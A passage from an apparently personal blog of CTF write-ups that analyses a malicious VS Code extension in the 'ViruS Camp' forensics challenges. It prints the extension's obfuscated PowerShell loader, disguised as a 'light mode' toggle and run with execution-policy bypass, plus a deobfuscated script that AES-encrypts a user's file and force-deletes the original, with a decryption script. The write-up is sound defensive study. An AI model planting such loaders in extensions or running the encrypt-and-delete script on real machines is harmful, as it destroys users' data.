;</span></span><br><span class="line"><span class="string">$9U5RgiwHSYtbsoLuD3Vf6 = $wy7qIGPnm36HpvjrL2TMUaRbz.ToCharArray() ; [array]::Reverse($9U5RgiwHSYtbsoLuD3Vf6) ; -join $9U5RgiwHSYtbsoLuD3Vf6 2&gt;&amp;1&gt; $null ;</span></span><br><span class="line"><span class="string">$FHG7xpKlVqaDNgu1c2Utw = [systeM.tEXT.ENCODIng]::uTf8.geTStRInG([sYsTeM.CoNVeRt]::FROMBase64StRIng(&quot;$9U5RgiwHSYtbsoLuD3Vf6&quot;)) ;</span></span><br><span class="line"><span class="string">$9ozWfHXdm8eIBYru = &quot;InV&quot;+&quot;okE&quot;+&quot;-ex&quot;+&quot;prE&quot;+&quot;SsI&quot;+&quot;ON&quot; ; new-aliaS -Name PwN -ValUe $9ozWfHXdm8eIBYru -fOrce ; pwn $FHG7xpKlVqaDNgu1c2Utw ;`</span>;</span><br><span class="line">        <span class="keyword">const</span> scriptPath = <span class="string">`C:\\Users\\vboxuser\\AppData\\Local\\Temp\\temp0001`</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            fs.<span class="title function_">writeFileSync</span>(scriptPath, scriptContent);</span><br><span class="line">            vscode.<span class="property">window</span>.<span class="title function_">showInformationMessage</span>(<span class="string">`The light mode will activate in a few minutes.`</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">            vscode.<span class="property">window</span>.<span class="title function_">showErrorMessage</span>(<span class="string">`Error activating light mode.`</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        (<span class="number">0</span>, child_process_1.<span class="property">exec</span>)(<span class="string">`powershell.exe -ExecutionPolicy Bypass -File &quot;<span class="subst">$&#123;scriptPath&#125;</span>&quot;`</span>, <span class="function">(<span class="params">error, stdout, stderr</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (error) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">`Error: <span class="subst">$&#123;error.message&#125;</span>`</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (stderr) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">`Stderr: <span class="subst">$&#123;stderr&#125;</span>`</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Stdout: <span class="subst">$&#123;stdout&#125;</span>`</span>);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">    context.<span class="property">subscriptions</span>.<span class="title function_">push</span>(command);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// VGhlIDFzdCBmbGFnIGlzOiBCSVRTQ1RGe0gwd19jNG5fdlNfYzBkM19sM3RfeTB1X3B1Ymwxc2hfbTRsMWNpb3VzX2V4NzNuc2kwbnNfU09fZWFzaWx5Pz9fNWE3YjMzNmN9</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">deactivate</span>(<span class="params"></span>) &#123; &#125;</span><br><span class="line"><span class="comment">//# sourceMappingURL=extension.js.map</span></span><br></pre></td></tr></table></figure>

<p>The first flag was fairly staright forward it was just b64 encoded and commented in the end of the above code so we got out first flag.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> <span class="string">&quot;VGhlIDFzdCBmbGFnIGlzOiBCSVRTQ1RGe0gwd19jNG5fdlNfYzBkM19sM3RfeTB1X3B1Ymwxc2hfbTRsMWNpb3VzX2V4NzNuc2kwbnNfU09fZWFzaWx5Pz9fNWE3YjMzNmN9&quot;</span> | <span class="built_in">base64</span> -d</span><br><span class="line">The 1st flag is: BITSCTF&#123;H0w_c4n_vS_c0d3_l3t_y0u_publ1sh_m4l1cious_ex73nsi0ns_SO_easily??_5a7b336c&#125;</span><br></pre></td></tr></table></figure>

<p>Flag: </p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">BITSCTF&#123;H0w_c4n_vS_c0d3_l3t_y0u_publ1sh_m4l1cious_ex73nsi0ns_SO_easily??_5a7b336c&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="ViruS-Camp-2"><a href="#ViruS-Camp-2" class="headerlink" title="ViruS Camp 2"></a>ViruS Camp 2</h3><h4 id="Challenge-Description-6"><a href="#Challenge-Description-6" class="headerlink" title="Challenge Description"></a>Challenge Description</h4><p>Follow up to the first challenge wherein now we need to decode the encryption methodology and decode the flag.enc we get from the same .ad1 file.</p>
<h4 id="Solution-6"><a href="#Solution-6" class="headerlink" title="Solution"></a>Solution</h4><p>On simple deobfuscation of the extension we get that it executed the following powershell script for the encryption.</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$password</span> = <span class="string">&quot;MyS3cr3tP4ssw0rd&quot;</span></span><br><span class="line"><span class="variable">$salt</span> = [<span class="built_in">Byte</span>[]](<span class="number">0</span>x01,<span class="number">0</span>x02,<span class="number">0</span>x03,<span class="number">0</span>x04,<span class="number">0</span>x05,<span class="number">0</span>x06,<span class="number">0</span>x07,<span class="number">0</span>x08)</span><br><span class="line"><span class="variable">$iterations</span> = <span class="number">10000</span></span><br><span class="line"><span class="variable">$keySize</span> = <span class="number">32</span>   </span><br><span class="line"><span class="variable">$ivSize</span> = <span class="number">16</span> </span><br><span class="line"></span><br><span class="line"><span class="variable">$deriveBytes</span> = <span class="built_in">New-Object</span> System.Security.Cryptography.Rfc2898DeriveBytes(<span class="variable">$password</span>, <span class="variable">$salt</span>, <span class="variable">$iterations</span>)</span><br><span class="line"><span class="variable">$key</span> = <span class="variable">$deriveBytes</span>.GetBytes(<span class="variable">$keySize</span>)</span><br><span class="line"><span class="variable">$iv</span> = <span class="variable">$deriveBytes</span>.GetBytes(<span class="variable">$ivSize</span>)</span><br><span class="line"></span><br><span class="line"><span class="variable">$inputFile</span> = <span class="string">&quot;C:\\Users\\vboxuser\\Desktop\\flag.png&quot;</span></span><br><span class="line"><span class="variable">$outputFile</span> = <span class="string">&quot;C:\\Users\\vboxuser\\Desktop\\flag.enc&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$aes</span> = [<span class="type">System.Security.Cryptography.Aes</span>]::Create()</span><br><span class="line"><span class="variable">$aes</span>.Key = <span class="variable">$key</span></span><br><span class="line"><span class="variable">$aes</span>.IV = <span class="variable">$iv</span></span><br><span class="line"><span class="variable">$aes</span>.Mode = [<span class="type">System.Security.Cryptography.CipherMode</span>]::CBC</span><br><span class="line"><span class="variable">$aes</span>.Padding = [<span class="type">System.Security.Cryptography.PaddingMode</span>]::PKCS7</span><br><span class="line"></span><br><span class="line"><span class="variable">$encryptor</span> = <span class="variable">$aes</span>.CreateEncryptor()</span><br><span class="line"></span><br><span class="line"><span class="variable">$plainBytes</span> = [<span class="type">System.IO.File</span>]::ReadAllBytes(<span class="variable">$inputFile</span>)</span><br><span class="line"></span><br><span class="line"><span class="variable">$outStream</span> = <span class="built_in">New-Object</span> System.IO.FileStream(<span class="variable">$outputFile</span>, [<span class="type">System.IO.FileMode</span>]::Create)</span><br><span class="line"><span class="variable">$cryptoStream</span> = <span class="built_in">New-Object</span> System.Security.Cryptography.CryptoStream(<span class="variable">$outStream</span>, <span class="variable">$encryptor</span>, [<span class="type">System.Security.Cryptography.CryptoStreamMode</span>]::<span class="built_in">Write</span>)</span><br><span class="line"></span><br><span class="line"><span class="variable">$cryptoStream</span>.Write(<span class="variable">$plainBytes</span>, <span class="number">0</span>, <span class="variable">$plainBytes</span>.Length)</span><br><span class="line"><span class="variable">$cryptoStream</span>.FlushFinalBlock()</span><br><span class="line"></span><br><span class="line"><span class="variable">$cryptoStream</span>.Close()</span><br><span class="line"><span class="variable">$outStream</span>.Close()</span><br><span class="line"></span><br><span class="line"><span class="built_in">Remove-Item</span> <span class="variable">$inputFile</span> <span class="literal">-Force</span></span><br></pre></td></tr></table></figure>

<p>So we write a reversing script in order to decode the flag.enc and get back the flag.png</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Protocol.KDF <span class="keyword">import</span> PBKDF2</span><br><span class="line"></span><br><span class="line">password = <span class="string">&quot;MyS3cr3tP4ssw0rd&quot;</span>.encode()</span><br><span class="line">salt = <span class="built_in">bytes</span>([<span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x03</span>, <span class="number">0x04</span>, <span class="number">0x05</span>, <span class="number">0x06</span>, <span class="number">0x07</span>, <span class="number">0x08</span>])</span><br><span class="line">iterations = <span class="number">10000</span></span><br><span class="line">key_size = <span class="number">32</span></span><br><span class="line">iv_size = <span class="number">16</span></span><br><span class="line"></span><br><span class="line">key_iv = PBKDF2(password, salt, dkLen=key_size + iv_size, count=iterations)</span><br><span class="line">key = key_iv[:key_size]</span><br><span class="line">iv = key_iv[key_size:key_size + iv_size]</span><br><span class="line"></span><br><span class="line">input_file = <span class="string">&quot;flag.enc&quot;</span></span><br><span class="line">output_file = <span class="string">&quot;flag.png&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(input_file, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    encrypted_data = f.read()</span><br><span class="line"></span><br><span class="line">cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">decrypted_data = cipher.decrypt(encrypted_data)</span><br><span class="line">pad_len = decrypted_data[-<span class="number">1</span>]</span><br><span class="line">decrypted_data = decrypted_data[:-pad_len]</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(decrypted_data)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Decryption successful: <span class="subst">&#123;output_file&#125;</span> restored.&quot;</span>)</span><br></pre></td></tr></table></figure>

<p><img src="/./images/flag.png" alt="Restored image"></p>
<p>Flag: </p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">BITSCTF&#123;h0pe_y0u_enj0yed_th1s_145e3f1a&#125;</span></span><br></pre></td></tr></table></figure>
</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Forensics/">Forensics</a><a class="post-meta__tags" href="/tags/Steganography/">Steganography</a><a class="post-meta__tags" href="/tags/File-Analysis/">File Analysis</a><a class="post-meta__tags" href="/tags/DFIR/">DFIR</a><a class="post-meta__tags" href="/tags/RF/">RF</a></div></div><nav class="pagination-post" id="pagination"></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/02/02/Nullcon-2025/" title="Nullcon 2025"><img class="cover" src="/images/logo_nullcon.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-02-02</div><div class="info-item-2">Nullcon 2025</div></div><div class="info-2"><div class="info-item-1">I participated in Nullcon 2025, as a core member of the team InfoSecIITR. Our team secured 9th place globally. Here are the Writeups of some challenges I was personally able to solve during the competition. MiscAncient PaperChallenge DescriptionWe are given an image file along the following description: “I found this ancient artifact stuck in an old machine labeled “29”. But what is its purpose?” SolutionInitial inspection leads to the conclusion that the image is of an IBM-29 punch card...</div></div></div></a><a class="pagination-related" href="/2024/06/12/BCACTF-5-0-2024/" title="BCACTF 5.0 2024"><img class="cover" src="/images/bcactf_logo.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-06-12</div><div class="info-item-2">BCACTF 5.0 2024</div></div><div class="info-2"><div class="info-item-1">I participated in BCACTF 2024, as a core member of the team InfoSecIITR. Our team secured 7th place globally. Here are the Writeups of some challenges I was personally able to solve during the competition. Forensics&#x2F;23-719-writeupChallenge DescriptionWe are given a pdf along with the following description: That’s a nice unanimous supreme court decision you’ve made public, sure would be a shame if someone didn’t properly clean up remnants of a prior version of the document before...</div></div></div></a><a class="pagination-related" href="/2025/01/07/irisctf2025/" title="IrisCTF-2025"><img class="cover" src="/images/icon.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-01-07</div><div class="info-item-2">IrisCTF-2025</div></div><div class="info-2"><div class="info-item-1">I participated in IrisCTF 2025, organized by IrisSec, as a core member of the team InfoSecIITR. Our team secured 9th place globally. Here are the Writeups of some Forensics, Netwroking and RF challenges I was personally able to solve during the competition. ForensicsdeldeldelChallenge Description Source File: deldeldel.tar.gz SolutionWe are give a packet capture file for this challenge. On viewing it in Wireshark a stream of USB packets can be discoverd.  The file name indicating a keylogger...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/pfp.jpeg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Ansh Aggarwal</div><div class="author-info-description">DFIR enjoyer | Networking enthusiast | CTF player @InfoSecIITR</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">4</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">1</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/W1r3W01f"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/W1r3W01f" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="https://www.linkedin.com/in/ansh-aggarwal-818591298/" target="_blank" title="Linkedin"><i class="fab fa-linkedin"></i></a><a class="social-icon" href="mailto:ansh_a@ece.iitr.ac.in" target="_blank" title="Email"><i class="fas fa-envelope"></i></a><a class="social-icon" href="https://discord.com/users/1129333663750959174" target="_blank" title="Discord"><i class="fab fa-discord"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Forensics"><span class="toc-number">1.</span> <span class="toc-text">Forensics</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Finders-Keepers"><span class="toc-number">1.1.</span> <span class="toc-text">Finders Keepers</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Challenge-Description"><span class="toc-number">1.1.1.</span> <span class="toc-text">Challenge Description</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Solution"><span class="toc-number">1.1.2.</span> <span class="toc-text">Solution</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AutoBots-Unite"><span class="toc-number">1.2.</span> <span class="toc-text">AutoBots Unite!</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Challenge-Description-1"><span class="toc-number">1.2.1.</span> <span class="toc-text">Challenge Description</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Solution-1"><span class="toc-number">1.2.2.</span> <span class="toc-text">Solution</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Symphonies"><span class="toc-number">1.3.</span> <span class="toc-text">Symphonies</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Challenge-Description-2"><span class="toc-number">1.3.1.</span> <span class="toc-text">Challenge Description</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Solution-2"><span class="toc-number">1.3.2.</span> <span class="toc-text">Solution</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Hardware-RF"><span class="toc-number">2.</span> <span class="toc-text">Hardware&#x2F;RF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ulation"><span class="toc-number">2.1.</span> <span class="toc-text">%ulation</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Challenge-Description-3"><span class="toc-number">2.1.1.</span> <span class="toc-text">Challenge Description</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Solution-3"><span class="toc-number">2.1.2.</span> <span class="toc-text">Solution</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Old-Skool"><span class="toc-number">2.2.</span> <span class="toc-text">Old Skool</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Challenge-Description-4"><span class="toc-number">2.2.1.</span> <span class="toc-text">Challenge Description</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Solution-4"><span class="toc-number">2.2.2.</span> <span class="toc-text">Solution</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DFIR"><span class="toc-number">3.</span> <span class="toc-text">DFIR</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ViruS-Camp-1"><span class="toc-number">3.1.</span> <span class="toc-text">ViruS Camp 1</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Challenge-Description-5"><span class="toc-number">3.1.1.</span> <span class="toc-text">Challenge Description</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Solution-5"><span class="toc-number">3.1.2.</span> <span class="toc-text">Solution</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ViruS-Camp-2"><span class="toc-number">3.2.</span> <span class="toc-text">ViruS Camp 2</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Challenge-Description-6"><span class="toc-number">3.2.1.</span> <span class="toc-text">Challenge Description</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Solution-6"><span class="toc-number">3.2.2.</span> <span class="toc-text">Solution</span></a></li></ol></li></ol></li></ol></div></div></div></div></main><footer id="footer" style="background-image: url(/img/wildlife-wolf-landscape-illustration-scenery-of-wolf-howling-silhouette-in-the-cliff-wolf-wildlife-panorama-for-illustration-background-or-wallpaper-.jpg);"><div id="footer-wrap"></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>